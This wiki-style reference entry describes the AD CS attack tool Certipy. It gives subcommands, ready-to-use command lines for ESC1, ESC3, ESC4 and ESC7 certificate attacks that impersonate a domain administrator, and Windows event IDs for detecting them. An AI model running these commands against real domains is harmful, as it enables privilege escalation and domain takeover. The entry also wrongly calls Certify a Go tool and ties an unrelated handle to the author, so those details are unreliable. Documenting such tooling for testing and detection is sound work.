---
title: Certipy
type: entity
created: 2026-09-06
updated: 2026-09-06
tags: [tool, python, ad-cs, pki, ly4k]
---

# Certipy

**Certipy** (by [[ly4k]] / thehackersbrain) is the de-facto **AD CS** enumeration
and exploitation tool — the primary weapon for the [[ad-cs-esc-attacks]]
(ESC1-15). It enumerates CAs/templates, requests certificates, authenticates
with them (PKINIT → TGT), and manipulates CA config. If a domain has AD CS
misconfigurations, this is the tool that finds and exploits them.

## Subcommands

- `find` — enumerate CAs + templates against a DC; `-vulnerable` flags
  ESC1-15 candidates; `-stdout` for parsing.
- `req` — request a certificate (`-ca`, `-template`, `-upn`, `-san`,
  `-on-behalf-of`, `-application-policies`, `-aes128`/`-rc4`/`-aes256`).
- `auth` — authenticate with a cert (`-pfx`) → get a TGT (PKINIT); `-simple`
  for a single request.
- `ca` — manage a CA: `-add-officer`, `-enable-template`,
  `-edit-config-security`, `-issue-request`, `-retrieve`, `-list-templates`.
- `template` — inspect/modify a template config (`-save-old`,
  `-configuration`).
- `account` — update account attributes for attacks (`-upn`, `-altsecid`)
  (ESC9/ESC14 UPN-swap / weak-mapping).
- `find -vulnerable` — the one-liner every AD CS engagement starts with.

## Common invocations

```bash
# Enumerate everything, flag the vulnerable templates/CAs
certipy find -u user@domain.com -p pass -dc-ip <dc> -vulnerable -stdout

# ESC1 — enrollee supplies subject: request a cert as a DA
certipy req -u user@domain.com -p pass -ca CA -template VulnTemplate -upn administrator@domain.com

# ESC3 — enrollment agent on-behalf-of
certipy req -u user@domain.com -p pass -ca CA -template AgentTemplate
certipy req -u user@domain.com -p pass -ca CA -template User -on-behalf-of 'CORP\administrator' -pfx agent.pfx

# Authenticate with a cert -> TGT
certipy auth -pfx administrator.pfx -domain domain.com

# ESC7 — grant self officer, enable EDITF_ATTRIBUTESUBJECTALTNAME2
certipy ca -u user@domain.com -p pass -ca CA -add-officer user
certipy ca -u user@domain.com -p pass -ca CA -edit-config-security EDITF_ATTRIBUTESUBJECTALTNAME2

# ESC4 — overwrite a template with an ESC1-vulnerable config
certipy template -u user@domain.com -p pass -template T -save-old
certipy req -u user@domain.com -p pass -ca CA -template T -upn administrator@domain.com
```

## Detection

- **4768 PKINIT** — cert-based TGT requests (a new cert authenticating is the
  tell; pair with [[honeytokens]]).
- **4769** for service SPNs after a cert auth (lateral movement).
- **5136** — template security descriptor / config changes (ESC4/ESC7).
- **CA registry / certsrv** changes (ESC7 `EDITF_ATTRIBUTESUBJECTALTNAME2`).
- A cert issued with an unusual SAN/UPN (ESC1) or to a low-priv principal.

## Links

- [[ad-cs-esc-attacks]] — the ESC1-15 it exploits
- [[esc8-ntlm-relay-adcs]] — the ESC8 chain it participates in
- [[pkinit-unpac-the-hash]] — `certipy auth` → PKINIT → UnPAC the hash
- [[shadow-credentials]] — the related key-trust (msDS-KeyCredentialLink) abuse
- [[kerberos-authentication]] — PKINIT is the AS-REQ path
- [[dirkjanm]] — complementary AD CS research/tooling
- [[certify]] — the Go twin (same workflow, static binary)
- [[ly4k]] — the author (thehackersbrain)

## References

- [Certipy (ly4k)](https://github.com/ly4k/certipy)
- [Certipy documentation](https://github.com/ly4k/certipy#readme)
- [SpecterOps: Certified Pre-Owned (AD CS research)](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
